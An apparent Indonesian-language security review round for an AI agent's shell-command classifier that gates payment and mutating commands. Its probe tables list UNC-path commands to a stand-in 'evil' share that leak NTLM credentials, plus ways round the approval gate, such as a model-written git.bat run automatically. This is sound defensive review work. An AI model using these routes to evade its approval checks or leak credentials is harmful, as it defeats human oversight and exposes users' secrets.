@@ -364,3 +364,57 @@ Probe `TestZZSec10R7` (`classify`, dialek `Cmd`/`Pwsh`/`Bash`, dijalankan di `a3
 | SEC10-24 | MINOR | static (residual) | Path **lokal** yang komponennya symlink ke target UNC (`mklink /D C:\work\l \\evil\s`) bukan "remote" menurut `remotePath`, sehingga `existingPrefix` → `EvalSymlinks` mengikuti symlink ke share **saat klasifikasi**. Membuat symlink semacam itu butuh `SeCreateSymbolicLink` (admin/Developer Mode), dan perintah `mklink … \\evil\s` sendiri kini `Unknown`. Junction tidak bisa menunjuk UNC. | Di `existingPrefix` Windows: `Lstat` per komponen, dan bila menemukan reparse point bertarget UNC (`os.Readlink` berawalan `\\` / `\??\UNC\`), berhenti dan perlakukan sebagai remote. |
 
 **Ringkasan Round 7:** #234 `61bf601` menutup SEC10-19/20/21, dan CI Windows kini hijau dengan test junction dan E2E `.bat` yang benar-benar berjalan. Klasifikasi tidak lagi menyentuh share. `GetDriveType` pada huruf drive dinilai tidak menyentuh share (inferensi; disarankan ditambah test CI). **REQUEST CHANGES kecil** untuk SEC10-22: target `pushd`/`Set-Location` UNC masih auto-approve dan membocorkan NTLM saat eksekusi; perbaikannya satu baris di `changeDir`. SEC10-23 adalah regresi otomasi Windows yang fail-closed (bisa diatasi dengan argumen `cwd`), dan SEC10-24 residual yang butuh hak symlink. #212 `a3ace00` APPROVE dengan syarat di-merge berurutan langsung dengan #234 setelah SEC10-22 ditutup.
+
+## Round 8 — 2026-10-22
+
+**Verdict:**
+
+| PR | Head | Verdict |
+|---|---|---|
+| #212 payment gate | `a3ace00` | **APPROVE**, di-merge berurutan langsung dengan #234 |
+| #234 hardening | `0969fd0` | **APPROVE dengan MINOR**: SEC10-22/23 FIXED; CI Windows dan macOS hijau. Sisa MINOR: SEC10-24 (residual Round 7), SEC10-25 (over-gate kecil), SEC10-26 (info) |
+
+**CI #234 (run `39729372155`, head `0969fd00…`)**: **Windows pass** (7m0s; `ok cmd/damnbot 20.0s`, `ok internal/exec/classify`, `ok internal/tools`), macOS pass, ubuntu masih antre saat dokumen ditulis. Seperti Round 7, `TestMonetaryKeyJunction` fatal bila `mklink /J` gagal di CI, sehingga kelulusan berarti test berjalan.
+
+Gate lokal di `0969fd0`: `go test -race -tags goolm -count=1 ./internal/exec/classify ./internal/tools ./internal/archtest` → ok; `./cmd/damnbot -run 'Skill|Payment|Monetary|PathKey|Canon|Key'` → ok; `GOOS=windows|darwin go vet` bersih; `make loc` `exec/classify 1826/1830` (ADR-133 butir 25); `make deadcode` 0.
+
+Probe `TestZZSec10R8` (tabel Round 7 + kasus baru; dihapus setelah dijalankan). Kolom keputusan: ask, ask+allow, auto, auto+allow, headless, headless+allow, unsafe, unsafe+allow.
+
+| Perintah | `a3ace00` | `61bf601` | `0969fd0` |
+|---|---|---|---|
+| cmd `cd /d <skill>\scripts && charge.bat` | mutating `QAQADAAA` | monetary | **monetary `PPPPDDDD`** ✔ |
+| cmd `cd <skill>\scripts; ./charge.sh` / `pushd <skill>\scripts & charge.bat` / `chdir <skill>` | campuran | monetary | **monetary** ✔ |
+| cmd `pushd \\evil\share` / `cd \\evil\share` / `pushd //evil/share` | mutating `QAQADAAA` | mutating | **unknown `PPPPDDDD`** ✔ SEC10-22 |
+| pwsh `Set-Location \\evil\share` / `Push-Location //evil/share` | mutating | mutating | **unknown** ✔ |
+| cmd `type \\evil\s\x.txt`, `\\evil\s\x.exe` | — | unknown | unknown ✔ |
+| **cmd `cd C:\work\sub && dir`** | `QAQADAAA` | unknown | **`QAQADAAA`** ✔ dipulihkan |
+| **cmd `cd sub && git status`**, `cd /d C:\work\sub && git status` | `QAQADAAA` | unknown | **`QAQADAAA`** ✔ |
+| **pwsh `Set-Location C:\work\sub; Get-ChildItem`**, `cd sub; git status` | `QAQADAAA` | unknown | **`QAQADAAA`** ✔ |
+| cmd `cd sub && go test ./...` | unknown (operand relatif) | unknown | unknown (sama dengan `a3ace00`) |
+| cmd `cd sub && charge.bat` (bare, bukan non-mutating) | mutating | unknown | **unknown** ✔ (cmd mencari cwd lebih dulu) |
+| cmd `cd sub && .\x.bat` | — | unknown | unknown ✔ |
+| cmd `cd %SKILL% && charge.bat`, `cd /d %SKILL% && dir`, `cd C:\work\s* && dir` | — | — | **unknown** ✔ (target tidak terlacak) |
+| pwsh `Set-Location -Path <skill>\scripts; .\charge.ps1` | unknown | monetary | **monetary** ✔ |
+| pwsh `Set-Location $env:SKILL; charge` | — | — | mutating (benar: PowerShell tidak menjalankan dari cwd tanpa `.\`) |
+| cmd `cd && dir` (cd tanpa argumen) | — | — | unknown → SEC10-25 |
+| cmd `pushd sub & dir & popd & dir` | — | — | unknown (`popd` di luar tabel non-mutating) → SEC10-25 |
+| bash `cd //tmp && ls` | mutating | — | unknown → SEC10-25 |
+| bash `cd sub && git status`, `cd /work/sub && ls` | mutating | mutating | mutating (tidak berubah) ✔ |
+
+### Penilaian
+
+- **SEC10-22:** argumen keluarga cd berawalan `\\` atau `//` → `Unknown` dan `cdTracked=false`, sebelum `s.abs`, tanpa I/O ✔.
+- **SEC10-23:** `afterCdUnknown` hanya untuk `Cmd`, dan hanya bila target cd tidak terlacak, argv0 relatif, atau perintah bare di luar `nonMutatingKeys`. Alur cd lokal yang sah kembali persis seperti `a3ace00` ✔. PowerShell memakai klasifikasi normal ditambah aturan argv0 relatif yang sudah ada ✔.
+- `cdTracked` = semua target literal ter-resolve dan setidaknya ada satu target. Argumen non-literal/glob/flag dilewati dan tidak dihitung sebagai target, sehingga cd yang hanya berisi variabel/glob menjadi tidak terlacak (fail-closed) ✔.
+
+### Temuan
+
+| ID | Severity | Status | Temuan | Perbaikan |
+|---|---|---|---|---|
+| SEC10-22 | MEDIUM | **fixed** `0969fd0` | Target cd UNC/`//` → `Unknown`. | — |
+| SEC10-23 | MINOR | **fixed** `0969fd0` | Aturan pasca-cd dipersempit; alur sah dipulihkan. | — |
+| SEC10-24 | MINOR | open (residual Round 7) | Symlink lokal bertarget UNC tetap diikuti `EvalSymlinks` saat klasifikasi (butuh hak symlink). | Seperti Round 7. |
+| SEC10-25 | MINOR (over-gate, fail-closed) | confirmed | Di `Cmd`, `cd` tanpa argumen dan `popd` sesudah `pushd` membuat perintah berikutnya `Unknown`, karena `popd` sendiri tidak ada di tabel non-mutating. Di semua dialek, `cd //path` (POSIX `//`) menjadi `Unknown`. | Tambahkan `popd` (dan `cd`/`pushd` tanpa argumen) ke perintah yang tidak memicu aturan, atau pulihkan `cdTracked` setelah `popd`. Batasi pemeriksaan `//` ke dialek Windows. |
+| SEC10-26 | info | pra-ada | `cmd.exe` mencari nama perintah bare di cwd **sebelum** `PATH`, juga **tanpa** cd. `git status` di root workspace yang berisi `git.bat` (ditulis model lewat `write_file`, auto di `auto-edit`) menjalankan `git.bat` dengan label `mutating`/allow. Aturan pasca-cd hanya menutup varian setelah cd. | Set `NoDefaultCurrentDirectoryInExePath=1` di environment shell `cmd` yang dijalankan runner, sehingga pencarian cwd untuk nama bare dimatikan. [INFERENCE: perlu diverifikasi di Windows] |
+
+**Ringkasan Round 8:** #234 `0969fd0` **APPROVE dengan MINOR**. Target cd remote (`\\`, `//`) kini `Unknown` di cmd dan PowerShell. Aturan pasca-cd dibatasi ke cmd, sehingga `cd sub && git status`, `cd C:\work\sub && dir`, `Set-Location sub; Get-ChildItem`, dan alur PowerShell sah lainnya kembali berperilaku seperti `a3ace00`, sedangkan bypass pembayaran tetap tertutup. CI Windows dan macOS hijau. #212 `a3ace00` **APPROVE**, dengan syarat di-merge berurutan langsung dengan #234. Sisa SEC10-24/25/26 tidak memblokir.
